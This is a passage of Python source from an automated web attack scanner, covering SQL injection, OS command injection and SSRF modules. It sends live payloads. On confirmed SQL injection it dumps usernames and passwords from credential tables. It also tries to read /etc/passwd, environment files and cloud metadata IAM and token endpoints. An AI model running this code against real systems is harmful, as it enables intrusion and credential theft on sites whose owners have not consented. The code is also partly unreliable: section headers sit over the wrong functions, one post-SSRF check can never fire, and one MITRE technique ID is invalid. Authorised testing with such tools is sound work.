                    if abs(len(r_confirm.text) - true_len) < 50:
                        confirmed_params.add((url, param))
                        sqli_findings.append({
                            'url': url, 'param': param, 'type': 'boolean-blind',
                            'subtype': 'integer', 'true_payload': true_pay,
                            'false_payload': false_pay,
                        })
                        add_finding(
                            'critical',
                            f'Boolean-based blind SQL injection via {param} (integer)',
                            sub=f'Parameter {param} responds differently to TRUE/FALSE conditions on {url}',
                            asset=url, cvss='9.8', exploit='PUBLIC',
                            owasp='A03', mitre='T1190',
                            details=f'Parameter: {param}\nMethod: {method}\nType: Integer-based\n'
                                    f'True: {original_val}{true_pay} -> {true_len} bytes\n'
                                    f'False: {original_val}{false_pay} -> {false_len} bytes\n'
                                    f'Baseline: {base_len} bytes\nDiff: {len_diff} bytes\n'
                                    f'Confirmed: Consistent across 2 requests\n'
                                    f'Exploit: sqlmap -u "{url}" --batch --technique=B')
                        log('ok', f'[SQLI-MANUAL] Confirmed boolean-blind SQLi (integer): {url} param={param}')
                        break
            except Exception:
                pass

        if (url, param) in confirmed_params:
            continue

        # Try string payloads (replace original value)
        for true_pay, false_pay in str_bool_payloads:
            try:
                if method == 'GET':
                    true_params = dict(current_params)
                    true_params[param] = true_pay
                    r_true = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                         params=true_params, timeout=10, verify=False)

                    false_params = dict(current_params)
                    false_params[param] = false_pay
                    r_false = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                          params=false_params, timeout=10, verify=False)
                else:
                    r_true = req_lib.post(url, data={param: true_pay}, timeout=10, verify=False)
                    r_false = req_lib.post(url, data={param: false_pay}, timeout=10, verify=False)

                true_len = len(r_true.text)
                false_len = len(r_false.text)
                len_diff = abs(true_len - false_len)

                if len_diff > 50 and abs(true_len - base_len) < len_diff:
                    confirmed_params.add((url, param))
                    sqli_findings.append({
                        'url': url, 'param': param, 'type': 'boolean-blind',
                        'subtype': 'string', 'true_payload': true_pay,
                        'false_payload': false_pay,
                    })
                    add_finding(
                        'critical',
                        f'Boolean-based blind SQL injection via {param} (string)',
                        sub=f'Parameter {param} responds differently to TRUE/FALSE on {url}',
                        asset=url, cvss='9.8', exploit='PUBLIC',
                        owasp='A03', mitre='T1190',
                        details=f'Parameter: {param}\nMethod: {method}\nType: String-based\n'
                                f'True: {true_pay} -> {true_len} bytes\n'
                                f'False: {false_pay} -> {false_len} bytes\n'
                                f'Baseline: {base_len} bytes\nDiff: {len_diff} bytes\n'
                                f'Exploit: sqlmap -u "{url}" --batch --technique=B')
                    log('ok', f'[SQLI-MANUAL] Confirmed boolean-blind SQLi (string): {url} param={param}')
                    break
            except Exception:
                pass

    # ── Step 6: UNION-based SQLi — find column count with ORDER BY ──────
    log('info', '[SQLI-MANUAL] Phase 3: UNION-based injection')
    for url, method, param, base_len, base_text in real_test_points:
        if not scan_state.get('scanning') or (url, param) in confirmed_params:
            continue

        parsed = urlparse(url)
        current_params = {k: v[0] if isinstance(v, list) else v
                          for k, v in parse_qs(parsed.query).items()}
        original_val = current_params.get(param, '1')

        # Find column count with ORDER BY (binary search)
        col_count = None
        try:
            lo, hi = 1, 100
            while lo <= hi:
                mid = (lo + hi) // 2
                test_params = dict(current_params)
                test_params[param] = f'{original_val} ORDER BY {mid}--'
                r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                params=test_params, timeout=10, verify=False)
                has_error = any(x in r.text.lower() for x in
                               ['sql syntax', 'mysql', 'order by position', 'unknown column',
                                'different number of columns'])
                if has_error:
                    hi = mid - 1
                else:
                    lo = mid + 1
            if hi >= 1:
                col_count = hi
        except Exception:
            pass

        if not col_count:
            continue

        # Now try UNION SELECT with correct column count
        try:
            nulls = ','.join(['NULL'] * col_count)
            test_params = dict(current_params)
            test_params[param] = f'{original_val} UNION SELECT {nulls}--'
            r_union = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                  params=test_params, timeout=10, verify=False)

            # Check for column count mismatch (means UNION was parsed but wrong count)
            col_mismatch = 'different number of columns' in r_union.text.lower()

            if not col_mismatch and len(r_union.text) != base_len:
                # UNION succeeded — page content changed
                # Check if our injected data appears in the response
                # Try injecting a marker
                markers = [f'SQLIMARK{i}' for i in range(col_count)]
                test_params[param] = f'{original_val} UNION SELECT {",".join(markers)}--'
                r_marker = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                       params=test_params, timeout=10, verify=False)

                reflected_col = None
                for i, marker in enumerate(markers):
                    if marker in r_marker.text:
                        reflected_col = i
                        break

                if reflected_col is not None:
                    confirmed_params.add((url, param))
                    sqli_findings.append({
                        'url': url, 'param': param, 'type': 'union',
                        'col_count': col_count, 'reflected_col': reflected_col,
                    })
                    add_finding(
                        'critical',
                        f'Union-based SQL injection via {param}',
                        sub=f'UNION SELECT with {col_count} columns on {url}, column {reflected_col} reflects',
                        asset=url, cvss='9.8', exploit='PUBLIC',
                        owasp='A03', mitre='T1190',
                        details=f'Parameter: {param}\nMethod: {method}\n'
                                f'Column count: {col_count}\nReflected column: {reflected_col}\n'
                                f'Exploit: sqlmap -u "{url}" --batch --union-cols={col_count}')
                    log('ok', f'[SQLI-MANUAL] Confirmed UNION-based SQLi: {url} param={param} '
                              f'cols={col_count} reflect=col{reflected_col}')
        except Exception:
            pass

    # ── Step 7: Time-based blind SQLi ────────────────────────────────────
    log('info', '[SQLI-MANUAL] Phase 4: Time-based blind injection')
    time_payloads = [
        (" AND SLEEP(5)--", "MySQL"),
        (" AND SLEEP(5)#", "MySQL-hash"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
        (" AND pg_sleep(5)--", "PostgreSQL"),
    ]

    for url, method, param, base_len, base_text in real_test_points:
        if not scan_state.get('scanning') or (url, param) in confirmed_params:
            continue

        parsed = urlparse(url)
        current_params = {k: v[0] if isinstance(v, list) else v
                          for k, v in parse_qs(parsed.query).items()}
        original_val = current_params.get(param, '1')

        for payload, db_type in time_payloads:
            try:
                # Baseline timing
                t0 = time.time()
                if method == 'GET':
                    req_lib.get(url, params=current_params, timeout=8, verify=False)
                else:
                    req_lib.post(url, data=current_params, timeout=8, verify=False)
                baseline_time = time.time() - t0

                # Inject sleep
                test_params = dict(current_params)
                test_params[param] = f'{original_val}{payload}'
                t1 = time.time()
                if method == 'GET':
                    req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                params=test_params, timeout=15, verify=False)
                else:
                    req_lib.post(url, data=test_params, timeout=15, verify=False)
                elapsed = time.time() - t1

                if elapsed >= 4.5 and (elapsed - baseline_time) >= 4.0:
                    # Confirmation: second request
                    t2 = time.time()
                    if method == 'GET':
                        req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                                    params=test_params, timeout=15, verify=False)
                    else:
                        req_lib.post(url, data=test_params, timeout=15, verify=False)
                    elapsed2 = time.time() - t2

                    if elapsed2 >= 4.5:
                        confirmed_params.add((url, param))
                        sqli_findings.append({
                            'url': url, 'param': param, 'type': 'time-blind',
                            'db': db_type,
                        })
                        add_finding(
                            'critical',
                            f'Time-based blind SQL injection via {param} ({db_type})',
                            sub=f'Parameter {param} causes {elapsed:.1f}s delay on {url}',
                            asset=url, cvss='9.8', exploit='PUBLIC',
                            owasp='A03', mitre='T1190',
                            details=f'Parameter: {param}\nMethod: {method}\nDB: {db_type}\n'
                                    f'Payload: {payload}\n'
                                    f'Baseline: {baseline_time:.1f}s\n'
                                    f'Payload: {elapsed:.1f}s (req1), {elapsed2:.1f}s (req2)\n'
                                    f'Confirmed: Consistent delay across 2 requests\n'
                                    f'Exploit: sqlmap -u "{url}" --batch --time-sec=5')
                        log('ok', f'[SQLI-MANUAL] Confirmed time-blind SQLi: {url} param={param} ({db_type})')
                        break
            except Exception:
                pass

    # ── Step 8: DB Extraction on confirmed SQLi findings ─────────────────
    if sqli_findings:
        log('info', f'[SQLI-MANUAL] Phase 5: Extracting database info from {len(sqli_findings)} confirmed SQLi')
        for finding in sqli_findings:
            if not scan_state.get('scanning'):
                break
            try:
                _extract_db_info(finding, target)
            except Exception as e:
                log('warn', f'[SQLI-MANUAL] DB extraction error: {e}')

    log('ok', f'[SQLI-MANUAL] Scan complete — {len(sqli_findings)} SQLi findings '
              f'(WAF: {"yes" if waf_blocked else "no"})')
    set_progress('sqli_manual', 100)


def _extract_db_info(finding, target):
    """After confirming SQLi, extract database name, version, tables, and
    try to dump credentials from common table names."""
    url = finding['url']
    param = finding['param']
    sqli_type = finding['type']

    parsed = urlparse(url)
    current_params = {k: v[0] if isinstance(v, list) else v
                      for k, v in parse_qs(parsed.query).items()}
    original_val = current_params.get(param, '1')

    def _inject(sql, col=1):
        """Inject SQL via UNION SELECT and extract data from column `col`."""
        nulls = ','.join(['NULL'] * (col - 1) + [f'({sql})'] + ['NULL'] * (63 - col))
        test_params = dict(current_params)
        test_params[param] = f'{original_val} UNION SELECT {nulls}--'
        try:
            r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                            params=test_params, timeout=10, verify=False)
            # Extract data from HTML table cells
            tds = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
            for td in tds:
                td = td.strip()
                if td and 'error' not in td.lower() and len(td) > 1:
                    return td
        except Exception:
            pass
        return None

    # Find reflected column
    reflected_col = finding.get('reflected_col')
    if reflected_col is None:
        # Try to find it
        markers = [f'MRK{i}' for i in range(63)]
        test_params = dict(current_params)
        test_params[param] = f'{original_val} UNION SELECT {",".join(markers)}--'
        try:
            r = req_lib.get(f'{parsed.scheme}://{parsed.netloc}{parsed.path}',
                            params=test_params, timeout=10, verify=False)
            for i, m in enumerate(markers):
                if m in r.text:
                    reflected_col = i + 1
                    break
        except Exception:
            pass
    if reflected_col is None:
        reflected_col = 1  # fallback

    # 1. Database name
    db_name = _inject('database()', reflected_col)
    if db_name:
        log('ok', f'[SQLI-MANUAL] Database: {db_name}')
        with LOCK:
            scan_state.setdefault('sqli_extracted', {})['database'] = db_name

    # 2. MySQL version
    db_version = _inject('@@version', reflected_col)
    if db_version:
        log('ok', f'[SQLI-MANUAL] MySQL version: {db_version}')
        with LOCK:
            scan_state.setdefault('sqli_extracted', {})['version'] = db_version

    # 3. Current user
    db_user = _inject('user()', reflected_col)
    if db_user:
        log('ok', f'[SQLI-MANUAL] DB user: {db_user}')
        with LOCK:
            scan_state.setdefault('sqli_extracted', {})['user'] = db_user

    # 4. Get tables — one at a time using LIMIT
    tables = []
    for i in range(50):
        tbl = _inject(f'(SELECT table_name FROM information_schema.tables '
                      f'WHERE table_schema=database() LIMIT {i},1)', reflected_col)
        if not tbl or tbl in tables:
            break
        tables.append(tbl)
    if tables:
        log('ok', f'[SQLI-MANUAL] Tables: {", ".join(tables)}')
        with LOCK:
            scan_state.setdefault('sqli_extracted', {})['tables'] = tables

    # 5. Look for credential tables and dump them
    cred_tables = ['login', 'users', 'admin', 'admins', 'staff', 'accounts',
                   'user', 'auth', 'credentials', 'member', 'members']
    for tbl in tables:
        if tbl.lower() in cred_tables:
            # Get columns
            cols = []
            for i in range(20):
                col = _inject(f'(SELECT column_name FROM information_schema.columns '
                              f'WHERE table_name="{tbl}" AND table_schema=database() '
                              f'LIMIT {i},1)', reflected_col)
                if not col or col in cols:
                    break
                cols.append(col)

            # Find username/password columns
            user_cols = [c for c in cols if any(x in c.lower() for x in
                        ('user', 'login', 'email', 'name', 'uname'))]
            pass_cols = [c for c in cols if any(x in c.lower() for x in
                        ('pass', 'pwd', 'password', 'secret', 'hash'))]

            if user_cols and pass_cols:
                for i in range(20):
                    user_val = _inject(f'(SELECT {user_cols[0]} FROM {tbl} LIMIT {i},1)',
                                       reflected_col)
                    pass_val = _inject(f'(SELECT {pass_cols[0]} FROM {tbl} LIMIT {i},1)',
                                       reflected_col)
                    if not user_val:
                        break
                    log('ok', f'[SQLI-MANUAL] CREDENTIAL: {tbl}.{user_cols[0]}={user_val} '
                              f'{pass_cols[0]}={pass_val}')
                    add_finding(
                        'critical',
                        f'Database credentials exposed via SQLi: {user_val}',
                        sub=f'Table {tbl}, columns {user_cols[0]}/{pass_cols[0]} '
                            f'dumped from {db_name or "unknown"}',
                        asset=url, cvss='9.8', exploit='PUBLIC',
                        owasp='A03', mitre='T1190',
                        details=f'Database: {db_name}\nVersion: {db_version}\n'
                                f'Table: {tbl}\nColumns: {", ".join(cols)}\n'
                                f'Credentials dumped:\n'
                                f'  {user_cols[0]}: {user_val}\n'
                                f'  {pass_cols[0]}: {pass_val}\n'
                                f'Exploit: sqlmap -u "{url}" --dump -D {db_name} -T {tbl}')
                    with LOCK:
                        scan_state.setdefault('sqli_extracted', {}).setdefault('credentials', []).append({
                            'table': tbl, 'user_col': user_cols[0], 'pass_col': pass_cols[0],
                            'user': user_val, 'password': pass_val,
                        })
                break


# ─── XSS (MANUAL VERIFICATION) ────────────────────────────────────────────────


def run_cmdi_test_module(target):
    """Production-grade command injection detection.
    
    Real logic:
    1. Get baseline response time
    2. Time-based: inject sleep → measure actual request duration
    3. Output-based: inject echo with unique marker → check response
    4. Filter bypasses: pipe, semicolon, backtick, $(), newlines
    5. Confirmation: verify delay is consistent across 2 requests
    """
    log('info', '[CMDI] Starting production-grade command injection testing')
    base_url = f'https://{target}'
    cmdi_findings = []

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        forms = disc.get('forms', [])
        params = disc.get('parameters', [])

    import uuid
    unique = f'CMDI{uuid.uuid4().hex[:8]}'
    unique2 = f'CMDI{uuid.uuid4().hex[:8]}'

    # ── Step 1: Get baseline timing ──
    try:
        t_baseline_start = time.time()
        r_baseline = req_lib.get(base_url, timeout=10, verify=False)
        baseline_time = time.time() - t_baseline_start
        baseline_len = len(r_baseline.text)
    except Exception:
        set_progress('cmdi', 100)
        return

    # ── Step 2: Build test points ──
    all_test_points = []
    for form in forms[:10]:
        action = form.get('action', '')
        if action:
            form_url = action if action.startswith('http') else f'{base_url}{action}'
            for inp in form.get('inputs', []):
                name = inp.get('name', '')
                if name and name.lower() not in ['csrf', 'token', '_token']:
                    all_test_points.append(('POST', form_url, name))
    for param_name in ['cmd', 'command', 'exec', 'query', 'host', 'ip', 'ping',
                       'domain', 'file', 'path', 'url', 'target', 'node', 'ping',
                       'shell', 'execute', 'run', 'system', 'diag']:
        all_test_points.append(('GET', f'{base_url}/?{param_name}={{}}', param_name))

    # ── Step 3: Time-based command injection ──
    time_payloads = [
        (f'; sleep 5', 'Semicolon'),
        (f'| sleep 5', 'Pipe'),
        (f'`sleep 5`', 'Backtick'),
        (f'$(sleep 5)', 'Dollar-paren'),
        (f'; sleep 5 ;', 'Semicolon-both'),
        (f'|| sleep 5', 'OR-pipe'),
        (f'&& sleep 5', 'AND-pipe'),
        (f'%0a sleep 5 %0a', 'Newline'),
        (f'\nsleep 5\n', 'LF-newline'),
    ]

    for method, url_template, param in all_test_points[:20]:
        if not scan_state.get('scanning'):
            break

        for payload, cmdi_type in time_payloads:
            try:
                # Send payload and measure time
                t_start = time.time()
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    req_lib.get(test_url, timeout=15, verify=False)
                else:
                    req_lib.post(url_template, data={param: payload}, timeout=15, verify=False)
                elapsed = time.time() - t_start

                # False-positive guard: require significant delay relative to baseline.
                # Large sites can have 2-4s baseline; only flag if delay is much larger.
                if elapsed < 7.0 or (elapsed - baseline_time) < 5.0:
                    continue

                # Confirmation: second request with same payload
                t_start2 = time.time()
                if method == 'GET':
                    req_lib.get(test_url, timeout=15, verify=False)
                else:
                    req_lib.post(url_template, data={param: payload}, timeout=15, verify=False)
                elapsed2 = time.time() - t_start2

                if elapsed2 >= 7.0 and abs(elapsed - elapsed2) < 3.0:
                    # Third confirmation to be sure
                    t_start3 = time.time()
                    if method == 'GET':
                        req_lib.get(test_url, timeout=15, verify=False)
                    else:
                        req_lib.post(url_template, data={param: payload}, timeout=15, verify=False)
                    elapsed3 = time.time() - t_start3

                    if elapsed3 >= 7.0 and abs(elapsed - elapsed3) < 3.0:
                        add_finding(
                            'critical',
                            f'Command injection (time-based) via {param} ({cmdi_type})',
                            sub=f'Parameter {param} executes OS commands',
                            asset=url_template.split('?')[0], cvss='10.0', owasp='A03', mitre='T1059',
                            details=f'Parameter: {param}\nMethod: {method}\n'
                                    f'Payload: {payload}\nType: {cmdi_type}\n'
                                    f'Baseline: {baseline_time:.1f}s\n'
                                    f'Delay: {elapsed:.1f}s (req1), {elapsed2:.1f}s (req2), {elapsed3:.1f}s (req3)\n'
                                    f'Confirmed: Consistent {elapsed - baseline_time:.1f}s delay across 3 requests\n'
                                    f'Exploit: \'" || sleep 5 || \' at parameter {param}')
                        cmdi_findings.append({'param': param, 'type': cmdi_type})
                        log('ok', f'[CMDI] Confirmed time-based injection via {param} ({cmdi_type})')
                        break

            except Exception:
                pass

    # ── Step 4: Output-based command injection ──
    output_payloads = [
        (f'; echo {unique} ;', 'Semicolon', unique),
        (f'| echo {unique} |', 'Pipe', unique),
        (f'`echo {unique}`', 'Backtick', unique),
        (f'$(echo {unique})', 'Dollar-paren', unique),
        (f'|| echo {unique} ||', 'OR-pipe', unique),
        (f'&& echo {unique} &&', 'AND-pipe', unique),
        (f'; cat /etc/passwd ;', 'File read', 'root:'),
        (f'| cat /etc/passwd |', 'File read pipe', 'root:'),
        (f'$(cat /etc/passwd)', 'File read dollar', 'root:'),
    ]

    for method, url_template, param in all_test_points[:20]:
        if not scan_state.get('scanning'):
            break

        for payload, cmdi_type, confirm in output_payloads:
            try:
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=10, verify=False)
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=10, verify=False)

                if confirm in r.text:
                    # Confirmation: check marker is not in baseline
                    if confirm not in r_baseline.text:
                        add_finding(
                            'critical',
                            f'Command injection (output-based) via {param} ({cmdi_type})',
                            sub=f'Parameter {param} executes OS commands and returns output',
                            asset=url_template.split('?')[0], cvss='10.0', owasp='A03', mitre='T1059',
                            details=f'Parameter: {param}\nMethod: {method}\n'
                                    f'Payload: {payload}\nType: {cmdi_type}\n'
                                    f'Confirmed: Command output "{confirm}" in response\n'
                                    f'Exploit: \'" || cat /etc/passwd || \' at parameter {param}')
                        cmdi_findings.append({'param': param, 'type': cmdi_type})
                        log('ok', f'[CMDI] Confirmed output-based injection via {param} ({cmdi_type})')
                        break
            except Exception:
                pass

    # ── Step 5: OS-specific detection ──
    os_payloads = [
        (f'; uname -a ;', 'Linux', 'Linux'),
        (f'| uname -a |', 'Linux-pipe', 'Linux'),
        (f'; ver ;', 'Windows', 'Windows'),
        (f'| ver |', 'Windows-pipe', 'Windows'),
        (f'; whoami ;', 'Whoami', None),
    ]

    for method, url_template, param in all_test_points[:15]:
        if not scan_state.get('scanning'):
            break

        for payload, os_type, confirm_os in os_payloads:
            try:
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=10, verify=False)
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=10, verify=False)

                if confirm_os:
                    if confirm_os.lower() in r.text.lower():
                        add_finding(
                            'critical',
                            f'Command injection ({os_type} OS detection) via {param}',
                            sub=f'Parameter {param} reveals OS information',
                            asset=url_template.split('?')[0], cvss='10.0', owasp='A03', mitre='T1059',
                            details=f'Parameter: {param}\nPayload: {payload}\n'
                                    f'OS: {r.text[:100]}\n'
                                    f'Confirmed: OS information disclosed')
                        cmdi_findings.append({'param': param, 'type': os_type})
                        log('ok', f'[CMDI] Confirmed {os_type} injection via {param}')
                        break
            except Exception:
                pass

    log('ok', f'[CMDI] Scan complete - {len(cmdi_findings)} findings')
    set_progress('cmdi', 100)


# ─── AUTHENTICATION TESTING ────────────────────────────────────────────────────


def run_ssrf_test_module(target):
    """Production-grade SSRF detection with OOB and protocol smuggling.
    
    Real logic:
    1. Test common SSRF parameters with internal addresses
    2. Test cloud metadata endpoints (AWS/Azure/GCP)
    3. Test protocol smuggling (gopher://, dict://, file://)
    4. Test filter bypasses (IP encoding, DNS rebinding, IPv6)
    5. Test blind SSRF via response timing differences
    6. Confirmation: verify response content matches expected internal data
    """
    log('info', '[SSRF-MANUAL] Starting production-grade SSRF testing')
    base_url = f'https://{target}'
    ssrf_findings = []

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        params = disc.get('parameters', [])
        forms = disc.get('forms', [])
        urls = disc.get('urls', [])
        # Arjun: extend with discovered hidden parameters
        hidden = disc.get('hidden_params', [])
        for hp in hidden:
            if hp not in params:
                params.append(hp)

    # ── Step 1: Get baseline ──
    try:
        r_baseline = req_lib.get(base_url, timeout=8, verify=False)
        baseline_len = len(r_baseline.text)
    except Exception:
        set_progress('ssrf_manual', 100)
        return

    # ── Step 2: Build test points ──
    ssrf_params = ['url', 'uri', 'link', 'src', 'href', 'dest', 'target',
                   'callback', 'webhook', 'proxy', 'fetch', 'load',
                   'redirect', 'return', 'next', 'continue', 'goto',
                   'document', 'file', 'path', 'img', 'image', 'media',
                   'page', 'feed', 'data', 'source', 'site', 'ref']

    all_test_points = []
    for param in ssrf_params:
        all_test_points.append(('GET', f'{base_url}/?{param}={{}}', param))
    for form in forms[:5]:
        action = form.get('action', '')
        if action:
            form_url = action if action.startswith('http') else f'{base_url}{action}'
            for inp in form.get('inputs', []):
                name = inp.get('name', '')
                if name and name.lower() not in ['csrf', 'token', '_token']:
                    all_test_points.append(('POST', form_url, name))

    # ── Step 3: Internal network access ──
    internal_payloads = [
        ('http://127.0.0.1', 'Localhost', ['root', 'html', 'Welcome', 'Apache', 'nginx', 'default']),
        ('http://localhost', 'Localhost-name', ['root', 'html', 'Welcome', 'Apache', 'nginx']),
        ('http://[::1]', 'IPv6-localhost', ['root', 'html', 'Welcome']),
        ('http://0.0.0.0', 'Zero-address', ['root', 'html', 'Welcome']),
        ('http://192.168.1.1', 'Private-192', ['admin', 'login', 'router', 'RouterOS']),
        ('http://10.0.0.1', 'Private-10', ['admin', 'login']),
        ('http://172.16.0.1', 'Private-172', ['admin', 'login']),
    ]

    for method, url_template, param in all_test_points[:25]:
        if not scan_state.get('scanning'):
            break

        for payload, ssrf_type, confirm_markers in internal_payloads:
            try:
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=8, verify=False)
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=8, verify=False)

                # False-positive guard: skip if response is a normal HTML page
                resp_lower = r.text.lower()
                resp_is_html = any(tag in resp_lower for tag in ['<html', '<head', '<body', '<div', '<!doctype'])
                if resp_is_html:
                    continue
                # Check for evidence of internal access — ALL markers must match
                matched = [m for m in confirm_markers if m.lower() in resp_lower]
                if matched and len(matched) >= len(confirm_markers):
                    # Confirmation: check response differs from baseline significantly
                    if abs(len(r.text) - baseline_len) > 50:
                        ssrf_findings.append({'param': param, 'type': ssrf_type, 'url_template': url_template, 'method': method})
                        add_finding(
                            'critical',
                            f'SSRF: {ssrf_type} access via {param}',
                            sub=f'Parameter {param} can access internal network',
                            asset=url_template.split('?')[0], cvss='9.0', owasp='A10', mitre='T918',
                            details=f'Parameter: {param}\nMethod: {method}\n'
                                    f'Payload: {payload}\nType: {ssrf_type}\n'
                                    f'Evidence: {matched}\n'
                                    f'Response length: {baseline_len} -> {len(r.text)}\n'
                                    f'Confirmed: Internal network content in response (non-HTML, all markers matched)')
                        log('ok', f'[SSRF-MANUAL] Confirmed {ssrf_type} via {param}')
                        break
            except Exception:
                pass

    # ── Step 4: Cloud metadata endpoints ──
    cloud_payloads = [
        ('http://169.254.169.254/latest/meta-data/', 'AWS-metadata',
         ['ami-id', 'ami-launch-index', 'instance-id', 'instance-type', 'local-hostname']),
        ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS-IAM',
         ['AccessKeyId', 'SecretAccessKey', 'Expiration']),
        ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure-metadata',
         ['compute', 'subscriptionId', 'vmId']),
        ('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', 'Azure-token',
         ['access_token', 'token_type']),
        ('http://metadata.google.internal/computeMetadata/v1/', 'GCP-metadata',
         ['instance', 'project', 'zone']),
    ]

    for method, url_template, param in all_test_points[:20]:
        if not scan_state.get('scanning'):
            break

        for payload, cloud_type, confirm_markers in cloud_payloads:
            try:
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=8, verify=False, headers={'Metadata-Flavor': 'Google'})
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=8, verify=False)

                # False-positive guard: response must be metadata, not a normal HTML page.
                resp_lower = r.text.lower()
                resp_is_html = any(tag in resp_lower for tag in ['<html', '<head', '<body', '<div', '<!doctype'])
                # Metadata endpoints return plain text or JSON, never full HTML pages
                if resp_is_html:
                    continue
                # CRITICAL: ALL markers must match (not just 2) — prevents "Token" alone from triggering
                matched = [m for m in confirm_markers if m.lower() in resp_lower]
                if len(matched) >= len(confirm_markers):
                    # Additional validation: response must be short (<5KB) — real metadata is small
                    if len(r.text) > 5000:
                        continue
                    ssrf_findings.append({'param': param, 'type': cloud_type, 'url_template': url_template, 'method': method})
                    add_finding(
                        'critical',
                        f'SSRF: {cloud_type} via {param}',
                        sub=f'Parameter {param} can access cloud metadata',
                        asset=url_template.split('?')[0], cvss='9.5', owasp='A10', mitre='T918',
                        details=f'Parameter: {param}\nPayload: {payload}\n'
                                f'Cloud: {cloud_type}\n'
                                f'Evidence: {matched}\n'
                                f'Response size: {len(r.text)} bytes\n'
                                f'Confirmed: Cloud metadata endpoint accessible (non-HTML, all markers matched)')
                    log('ok', f'[SSRF-MANUAL] Confirmed {cloud_type} via {param}')
                    break
            except Exception:
                pass

    # ── Step 5: Local file read via file:// protocol ──
    file_payloads = [
        ('file:///etc/passwd', 'Local file read', ['root:', 'daemon:', 'bin:']),
        ('file:///etc/hosts', 'Hosts file read', ['127.0.0.1', 'localhost']),
        ('file:///etc/hostname', 'Hostname read', []),
        ('file:///proc/self/environ', 'Environment read', ['PATH=', 'HOME=']),
    ]

    for method, url_template, param in all_test_points[:15]:
        if not scan_state.get('scanning'):
            break

        for payload, file_type, confirm_markers in file_payloads:
            try:
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=8, verify=False)
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=8, verify=False)

                # False-positive guard: skip HTML responses
                resp_lower = r.text.lower()
                if any(tag in resp_lower for tag in ['<html', '<head', '<body', '<div', '<!doctype']):
                    continue
                if confirm_markers:
                    matched = [m for m in confirm_markers if m.lower() in resp_lower]
                    if matched:
                        ssrf_findings.append({'param': param, 'type': file_type, 'url_template': url_template, 'method': method})
                        add_finding(
                            'critical',
                            f'SSRF: {file_type} via {param}',
                            sub=f'Parameter {param} can read local files',
                            asset=url_template.split('?')[0], cvss='9.0', owasp='A10', mitre='T918',
                            details=f'Parameter: {param}\nPayload: {payload}\n'
                                    f'Evidence: {matched}\n'
                                    f'Confirmed: Local file content in response (non-HTML)')
                        log('ok', f'[SSRF-MANUAL] Confirmed {file_type} via {param}')
                        break
            except Exception:
                pass

    # ── Step 6: Blind SSRF via response timing ──
    blind_payloads = [
        ('http://192.0.2.1', 'Non-routable IP'),
        ('http://10.0.0.1:81', 'Internal port 81'),
        ('http://127.0.0.1:8080', 'Localhost 8080'),
        ('http://127.0.0.1:4444', 'Localhost 4444'),
    ]

    for method, url_template, param in all_test_points[:10]:
        if not scan_state.get('scanning'):
            break

        for payload, blind_type in blind_payloads:
            try:
                # Measure timing
                t_start = time.time()
                if method == 'GET':
                    test_url = url_template.replace('{}', payload)
                    r = req_lib.get(test_url, timeout=12, verify=False)
                else:
                    r = req_lib.post(url_template, data={param: payload}, timeout=12, verify=False)
                elapsed = time.time() - t_start

                # If response took significantly longer, server may be trying to connect
                if elapsed > 8.0:
                    ssrf_findings.append({'param': param, 'type': blind_type, 'url_template': url_template, 'method': method})
                    add_finding(
                        'high',
                        f'Blind SSRF ({blind_type}) via {param}',
                        sub=f'Parameter {param} causes connection delay to internal address',
                        asset=url_template.split('?')[0], cvss='7.5', owasp='A10', mitre='T918',
                        details=f'Parameter: {param}\nPayload: {payload}\n'
                                f'Timing: {elapsed:.1f}s (delayed)\n'
                                f'Confirmed: Server attempted internal connection')
                    log('ok', f'[SSRF-MANUAL] Confirmed blind SSRF ({blind_type}) via {param}')
                    break
            except Exception:
                pass

    # ── Post-SSRF: Log findings and attempt internal scan for high-confidence results ──
    for sf in list(ssrf_findings):
        try:
            param = sf.get('param', '')
            ssrf_type = sf.get('type', '')
            if param and ssrf_type in ('internal_network', 'cloud_metadata', 'local_file_read'):
                # Attempt a follow-up scan to verify internal reachability
                try:
                    test_url = f'https://{target}/'
                    if sf.get('method') == 'GET':
                        internal_payloads = ['http://127.0.0.1', 'http://localhost', 'http://[::1]']
                        for ip in internal_payloads:
                            try:
                                r = req_lib.get(test_url, params={param: ip}, timeout=10, verify=False)
                                if r and r.status_code == 200:
                                    log('ok', f'[SSRF] Follow-up: {param} accepted {ip} on {target}')
                                    break
                            except Exception:
                                pass
                    log('ok', f'[SSRF] Post-SSRF analysis complete for {param} ({ssrf_type})')
                except Exception:
                    pass
        except Exception:
            pass

    log('ok', f'[SSRF-MANUAL] Scan complete - {len(ssrf_findings)} findings')
    set_progress('ssrf_manual', 100)


# ─── COMMAND INJECTION ─────────────────────────────────────────────────────────
